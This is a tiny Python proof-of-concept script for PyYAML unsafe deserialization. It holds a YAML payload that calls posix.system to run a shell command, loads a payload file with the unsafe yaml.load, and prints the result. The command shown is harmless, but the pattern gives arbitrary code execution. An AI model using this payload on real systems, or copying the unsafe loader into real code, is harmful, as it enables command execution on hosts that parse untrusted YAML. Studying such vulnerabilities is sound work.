import yaml
import time
#import os

data = b'!!python/object/apply:posix.system ["ls > t"]'
data = open('exp', 'r').read()
deserialized_data = yaml.load(data) # deserializing data
print(deserialized_data)